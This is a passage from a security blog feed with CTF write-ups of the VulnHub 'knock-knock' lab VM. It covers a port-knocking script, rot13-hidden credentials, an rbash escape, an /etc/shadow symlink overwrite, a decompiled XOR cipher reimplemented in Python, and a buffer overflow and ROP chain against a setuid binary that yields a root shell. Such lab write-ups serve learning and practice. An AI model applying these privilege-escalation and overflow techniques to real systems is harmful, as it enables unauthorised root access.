</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason <span class="m">1941</span> Oct <span class="m">16</span> 13:29 rop.py       <span class="c"># the rop exploit</span>
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root  jason <span class="m">7457</span> Oct <span class="m">11</span> 18:35 tfc
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>python rop.py <span class="nb">read</span>                  <span class="c"># generate the ROP exploit using &#39;read&#39;</span>
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> <span class="nv">filesize</span> <span class="o">=</span> 4966
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> need <span class="m">10</span> iterations
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>ls -l
</span><span class='line'>total 32
</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason  <span class="m">109</span> Oct <span class="m">16</span> 14:31 getshell.c
</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason <span class="m">4564</span> Oct <span class="m">16</span> 14:31 out.tfc      <span class="c"># this is the file we will feed to tfc</span>
</span><span class='line'>-rwxr-xr-x <span class="m">1</span> jason jason <span class="m">4966</span> Oct <span class="m">16</span> 14:31 <span class="nb">read</span>
</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason <span class="m">1941</span> Oct <span class="m">16</span> 13:29 rop.py
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root  jason <span class="m">7457</span> Oct <span class="m">11</span> 18:35 tfc
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>./tfc out.tfc pwned.tfc             <span class="c"># let&#39;s run the ROP exploit</span>
</span><span class='line'>Segmentation fault
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>ls -l
</span><span class='line'>total 40
</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason  <span class="m">109</span> Oct <span class="m">16</span> 14:31 getshell.c
</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason <span class="m">4564</span> Oct <span class="m">16</span> 14:31 out.tfc
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root  jason    <span class="m">0</span> Oct <span class="m">16</span> 14:32 pwned.tfc
</span><span class='line'>-rwxr-xr-x <span class="m">1</span> jason jason <span class="m">4966</span> Oct <span class="m">16</span> 14:31 <span class="nb">read</span>
</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason <span class="m">1941</span> Oct <span class="m">16</span> 13:29 rop.py
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root  jason <span class="m">7457</span> Oct <span class="m">11</span> 18:35 tfc
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root  jason <span class="m">5120</span> Oct <span class="m">16</span> 14:32 write        <span class="c"># this is a copy of our helper program, but SETUID!</span>
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>./write                             <span class="c"># let&#39;s give it a spin!</span>
</span><span class='line'><span class="c"># whoami</span>
</span><span class='line'>root                                                    <span class="c"># YEAHHH!!</span>
</span></code></pre></td></tr></table></div></figure>


<p>And picture-proof:</p>

<p><img src="http://barrebas.github.io/assets/knockknock-rop.png" alt="" /></p>

<p>It worked! The file <code>write</code> is created with SUID set and contains the shell-spawning helper program. Mind you, when I was writing this ROP exploit, I used a local copy of <code>tfc</code> that was not running as root. When the <code>write</code> file was created, it had the SUID bit set, but as soon as something was written to it, the SUID bit was removed. This is security feature (?) is ignored when running as root! Lucky for me ;)</p>

<p>So this is another way to root. I wonder how many more there are! :) Again, thanks zer0w1re and <a href="http://vulnhub.com">VulnHub</a> for hosting this VM! Also cheers to leonjza for proof-reading this post!!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Moving to GitHub Pages]]></title>
    <link href="http://barrebas.github.io/blog/2014/10/14/moving-to-github-pages/"/>
    <updated>2014-10-14T21:26:55+02:00</updated>
    <id>http://barrebas.github.io/blog/2014/10/14/moving-to-github-pages</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve decided to move my blog from <a href="http://staringintodevnull.blogspot.nl">staringintodevnull.blogspot.nl</a> to Github Pages. Because Markdown!</p>

<p>I won&rsquo;t convert the old posts&ndash; they&rsquo;ll stay on Blogger.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Knock-knock-knocking on Root's Door]]></title>
    <link href="http://barrebas.github.io/blog/2014/10/14/knock-knock-knocking-on-roots-door/"/>
    <updated>2014-10-14T21:21:59+02:00</updated>
    <id>http://barrebas.github.io/blog/2014/10/14/knock-knock-knocking-on-roots-door</id>
    <content type="html"><![CDATA[<p>Near the end of ASIS CTF, in which <code>vulnhub-ctf</code> took part, zer0w1re decided to release his first VM called knock-knock! Naturally, I had to download it and give it a shot :)</p>

<!--more-->


<p>The name already gives a big hint. I supposed I had to deal with a port-knocking deamon like <code>knockd</code>. I opened the ova in VirtualBox and booted the virtual machine. I ran a ping scan with <code>nmap</code> and then a normal scan.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>sudo nmap 10.8.7.101 -sS -p- -T4
Starting Nmap 6.00 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 21:27 CEST

Nmap scan report <span class="k">for</span> 10.8.7.101
Host is up <span class="o">(</span>0.00052s latency<span class="o">)</span>.
Not shown: <span class="m">65534</span> filtered ports
PORT     STATE SERVICE
1337/tcp open  waste
MAC Address: 08:00:27:BE:DD:C8 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 143.73 seconds</code></pre></div>


<p>The scan took ages to complete, but did give me exactly <em>one</em> port to connect to. If that isn&rsquo;t a clear path, then I don&rsquo;t know what is. Connecting to 1337 with <code>nc</code> returns a list of three numbers. Not just any kind of numbers, no! They had to be port numbers. Let the knocking commence! I whipped up a small Python script to automate it:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;10.8.7.101&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">))</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span>
<span class="n">ports</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>

<span class="k">try</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">&#39;port: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">a</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">a</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;10.8.7.101&#39;</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">])))</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">pass</span>
<span class="k">try</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">&#39;port: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
    <span class="n">b</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">b</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;10.8.7.101&#39;</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">1</span><span class="p">])))</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">pass</span>
<span class="k">try</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">&#39;port: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">c</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;10.8.7.101&#39;</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">2</span><span class="p">])))</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">pass</span></code></pre></div>


<p>Probably not the most elegant way of doing it, but I was still in a CTF mindset ;) I ran the script and then <code>nmap</code> again, but found that nothing had happened! What could be going on here? I tried to debug script a bit, added the try/except blocks to make it robust, but I couldn&rsquo;t figure out why it wasn&rsquo;t working. Maybe not all of the knocks were getting through? I decided to run the script continuously:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span><span class="k">while</span> <span class="o">[[</span> <span class="m">1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do</span> python ./knock.py<span class="p">;</span> <span class="k">done</span>
port: 37586
port: 25290
port: 48122
port: 16312
port: 44654
port: 25600
port: 53987
port: 55993
&lt;snip&gt;</code></pre></div>


<p>After a while, I ran <code>nmap</code> for the umpthieth time and lo and behold, <code>ssh</code> and <code>http</code> were open! Later, when I rooted the box, I had a look at the script that sets up the port knocking. It randomizes the port order, so there&rsquo;s a one in six chance that my script gets it right. I modified it so that it completes the port-knocking every time:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">itertools</span>

<span class="k">def</span> <span class="nf">knock</span><span class="p">(</span><span class="n">ports</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">&#39;port: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">a</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">a</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;10.8.7.101&#39;</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">])))</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">&#39;port: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
        <span class="n">b</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">b</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;10.8.7.101&#39;</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">1</span><span class="p">])))</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">&#39;port: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
        <span class="n">c</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">c</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;10.8.7.101&#39;</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">ports</span><span class="p">[</span><span class="mi">2</span><span class="p">])))</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;10.8.7.101&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">))</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span>
<span class="n">ports</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>

<span class="k">for</span> <span class="n">portlist</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">ports</span><span class="p">):</span>
    <span class="n">knock</span><span class="p">(</span><span class="n">portlist</span><span class="p">)</span></code></pre></div>




<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>sudo nmap 10.8.7.101 -sS -T4 -p1-100

Starting Nmap 6.00 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 21:35 CEST
Nmap scan report <span class="k">for</span> 10.8.7.101
Host is up <span class="o">(</span>0.00043s latency<span class="o">)</span>.
Not shown: <span class="m">98</span> filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:BE:DD:C8 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 1.93 seconds</code></pre></div>


<p>I had no credentials for <code>ssh</code> so I fired up a browser and pointed it at 10.8.7.101. I also started <code>dirbuster</code> just in case.</p>

<p><img src="http://barrebas.github.io/assets/knockknock-00.png" alt="" /></p>

<p>Not much was on that webpage, not even in the source. I grabbed the image and poked at it using stego tools such as <code>stepic</code> and <code>outguess</code>, which came up negative. A quick <code>strings</code> on the jpg revealed something much more interesting:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>strings knockknock.jpg
&lt;snip&gt;
<span class="nv">CN</span><span class="o">=</span>i
<span class="se">\,</span>mk
1W<span class="o">}</span>R
LUv*
<span class="se">\U</span>v*
*M1W
tR<span class="o">)</span>O
MO:/?
qW<span class="p">|</span>U
<span class="se">\+\U</span>
Login Credentials
abfnW
sax2Cw9Ow</code></pre></div>


<p>I figured that it was worth a shot, even though the credentials looked weird. Needless to say, they didn&rsquo;t work. I switched them around as well but no luck. The strings looked mangled, so what could have been done to them? <code>rot13</code> maybe? Indeed, after dumping the strings in <a href="http://www.rot13.com/">rot13.com</a>, I got something that resembled a user name: nosaJ, which is Jason reversed. The same was done for the password and the combination that let me in was <code>jason:jB9jP2knf</code>. I could <code>ssh</code> in and was presented with a shell! I pressed &lsquo;up&rsquo; to view the command history, but <code>.bash_history</code> was symlinked to <code>/dev/null</code>. I fixed that and went on. <code>ls -alh</code> showed a setuid binary called <code>tfc</code>. Owned by root, I might add! Turns out that jason actually has a restricted bash, but that was quickly solved using <code>nice /bin/bash</code> (after Persistence, I learned four more ways of escaping <code>rbash</code> ;)).</p>

<p>Looking at this <code>tfc</code> binary, it seems that it is a &ldquo;tiny file crypter&rdquo;. Playing around with it, I was able to encrypt a file and decrypt it again. This meant that it was doing some kind of symmetrical encryption.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">jason@knockknock:~<span class="nv">$ </span>./tfc
_______________________________  
<span class="se">\_</span>_    ___/<span class="se">\_</span>   _____/<span class="se">\_</span>   ___ <span class="se">\ </span>
  <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>    __<span class="o">)</span>  /    <span class="se">\ </span> <span class="se">\/</span> 
  <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>     <span class="se">\ </span>  <span class="se">\ </span>    <span class="se">\_</span>___
  <span class="p">|</span>____<span class="p">|</span>    <span class="se">\_</span>__  /    <span class="se">\_</span>_____  /
                <span class="se">\/</span>            <span class="se">\/</span> 

    Tiny File Crypter - 1.0

Usage: ./tfc &lt;filein.tfc&gt; &lt;fileout.tfc&gt;</code></pre></div>


<p>When I downloaded the first public version of this VM, <code>tfc</code> still allowed symlinks. It wanted the filenames to end with .tfc, so I made a symlink to <code>/etc/shadow</code>, used that as input for <code>tfc</code>, decrypted it to get the shadow file. I then copied the line containing the hash of jason&rsquo;s password and overwrote the line for root. Reversing the process again overwrote <code>/etc/shadow</code> and I had root! However, this was not intended and zer0w1re released a fixed version&hellip;</p>

<p>So I had to exploit <code>tfc</code> the proper way. Now, this binary was made by c0ne, so I was in for a treat! I first gave it a huge input file:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">jason@knockknock:~<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*10000&#39;</span> &gt; in.tfc 
jason@knockknock:~<span class="nv">$ </span>./tfc ./in.tfc out.tfc
Segmentation fault</code></pre></div>


<p>Well, well, well, a segfault! This looked promising. Unfortunately, <code>gdb</code> was not installed on this VM, so I transferred the binary over to my box and repeated the process.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*10000&#39;</span> &gt; in.tfc
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span><span class="nb">ulimit</span> -c unlimited
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>./tfc in.tfc out.tfc
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>

bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>gdb ./tfc core
GNU gdb <span class="o">(</span>GDB<span class="o">)</span> 7.4.1-debian
&lt;snip&gt;
Program terminated with signal 11, Segmentation fault.
<span class="c">#0  0x0675c916 in ?? ()</span>
gdb-peda<span class="err">$</span></code></pre></div>


<p>Hmm. So we have a segfault, but <code>eip</code> is not overwritten by <code>0x41414141</code>. Something funky is going on! I assumed <code>eip</code> was being overwritten by the encrypted bytes, so I needed to first encrypt my payload before <code>tfc</code> would process it and decrypt it again. Over at #vulnhub, recrudesce dropped a nice link for an online disassembler. I decided that this was a nice moment to give <a href="http://decompiler.fit.vutbr.cz/">the Retargetable Decompiler</a> a spin! I uploaded the binary and using the output and <code>objdump</code>, I started analyzing the binary.</p>

<p><img src="http://barrebas.github.io/assets/knockknock-01.png" alt="" /></p>

<p>It boils down to this: the binary takes an input file, read it four bytes at a time, and encrypts it using the <code>xcrypt</code> function. For the next four bytes, it shuffles the XOR key around. It loops until there are less than four bytes remaining, which are also encrypted. I decided to rip and copy this decompiled C code as much as possible. I have changed the names of the variables a bit:</p>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int32_t</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="kt">int32_t</span> <span class="o">*</span> <span class="n">a1_buffer</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">a2_buffersize</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int32_t</span> <span class="o">*</span> <span class="n">v1_buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int32_t</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="n">a1_buffer</span><span class="p">;</span>
    <span class="kt">int32_t</span> <span class="n">v2</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0x15e54e61</span><span class="p">;</span>
    
    <span class="k">if</span> <span class="p">(</span><span class="n">a2_buffersize</span> <span class="o">&gt;=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">int32_t</span> <span class="o">*</span> <span class="n">v3_buffer</span> <span class="o">=</span> <span class="n">v1_buffer</span><span class="p">;</span>
        <span class="kt">int32_t</span> <span class="n">v4_index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="kt">int32_t</span> <span class="n">v5_xor</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0x15e54e61</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// 0x8048634</span>
            <span class="n">v3_buffer</span><span class="p">[</span><span class="n">v4_index</span><span class="p">]</span> <span class="o">^=</span> <span class="n">v5_xor</span><span class="p">;</span>
            
            <span class="kt">uint32_t</span> <span class="n">v6_xor</span> <span class="o">=</span> <span class="n">v5_xor</span><span class="p">;</span>
            <span class="c1">// branch -&gt; 0x8048662</span>
            <span class="kt">int32_t</span> <span class="n">v7_temp</span><span class="p">;</span> <span class="c1">// 0x804866f</span>
            
            <span class="cm">/* change v6_xor */</span>
            <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="kt">uint32_t</span> <span class="n">v8</span> <span class="o">=</span> <span class="n">v6_xor</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span> <span class="c1">// 0x8048678</span>
                <span class="n">v7_temp_xor</span> <span class="o">=</span> <span class="n">v6_xor</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">?</span> <span class="nl">v8</span> <span class="p">:</span> <span class="n">v8</span> <span class="o">^</span> <span class="mh">0x6daa1cf4</span><span class="p">;</span>
                <span class="c1">// PHI copies at the loop end</span>
                <span class="n">v6_xor</span> <span class="o">=</span> <span class="n">v7_temp_xor</span><span class="p">;</span>
                <span class="c1">// loop 0x8048662 end</span>
            <span class="p">}</span>
            
            <span class="kt">int32_t</span> <span class="n">v9_indexplusone</span> <span class="o">=</span> <span class="n">v4_index</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// 0x8048685</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">a2_buffersize</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">&gt;</span> <span class="n">v9_indexplusone</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// 0x8048685</span>
                <span class="n">v3_buffer</span> <span class="o">=</span> <span class="n">v1_buffer</span><span class="p">;</span>
                <span class="n">v4_index</span> <span class="o">=</span> <span class="n">v9_index</span><span class="p">;</span>
                <span class="n">v5_xor</span> <span class="o">=</span> <span class="n">v7_temp_xor</span><span class="p">;</span>
                <span class="c1">// branch -&gt; 0x8048634</span>
                <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="n">v2_xor</span> <span class="o">=</span> <span class="n">v7_temp_xor</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    
    <span class="kt">int32_t</span> <span class="n">v10</span> <span class="o">=</span> <span class="n">a2_buffersize</span> <span class="o">%</span> <span class="mi">4</span><span class="p">;</span> <span class="c1">// 0x80486d7</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">v10</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// 0x80486df</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="cm">/* encrypt last bytes, but lets assume our sploit will be 4 byte aligned */</span></code></pre></div>


<p>I wrote a very, very ugly piece of Python do the encryption for me:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;in.tfc&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    
    <span class="n">xorkey</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0x15e54e61</span>
    
    <span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">block</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">:(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>
        <span class="n">int_block</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;i&#39;</span><span class="p">,</span> <span class="n">block</span><span class="p">)</span>
        <span class="n">output</span> <span class="o">+=</span> <span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;i&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">int_block</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="n">xorkey</span><span class="p">)))</span>
        
        <span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
            <span class="n">v8</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">xorkey</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7fffffff</span><span class="p">)</span> <span class="c"># not sure why 0x7fff.. i.o. 0xffff</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">xorkey</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span> 
                <span class="n">v7</span> <span class="o">=</span> <span class="n">v8</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">v7</span> <span class="o">=</span> <span class="n">v8</span> <span class="o">^</span> <span class="mh">0x6daa1cf4</span>
            <span class="n">xorkey</span> <span class="o">=</span> <span class="n">v7</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;out2.tfc&#39;</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>


<p>Like I said, a CTF mindset and some very ugly Python code, but I was now able to encode my payload (updated version at end of post). I gave it a spin:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*5000&#39;</span> &gt; in.tfc
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>python ./enc.py
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>./tfc out2.tfc bleh.tfc
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>gdb ./tfc core
GNU gdb <span class="o">(</span>GDB<span class="o">)</span> 7.4.1-debian
&lt;snip&gt;
Core was generated by <span class="s1">&#39;./tfc out2.tfc bleh.tfc&#39;</span>.
Program terminated with signal 11, Segmentation fault.
<span class="c">#0  0x41414141 in ?? ()</span>
gdb-peda<span class="err">$</span></code></pre></div>


<p>Yeah! I was able to overwrite <code>eip</code>! I narrowed down the buffer and determined which part was responsible for overwriting <code>eip</code> by trial-and-error and looking at the stack in the coredump. I finally found:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*4124+&quot;B&quot;*4+&quot;C&quot;*4&#39;</span> &gt; in.tfc <span class="o">&amp;&amp;</span> python ./enc.py 
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>./tfc out2.tfc bleh.tfc
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>gdb ./tfc core
GNU gdb <span class="o">(</span>GDB<span class="o">)</span> 7.4.1-debian
&lt;snip&gt;
Program terminated with signal 11, Segmentation fault.
<span class="c">#0  0x42424242 in ?? ()</span>
gdb-peda<span class="nv">$ </span>checksec
CANARY    : disabled
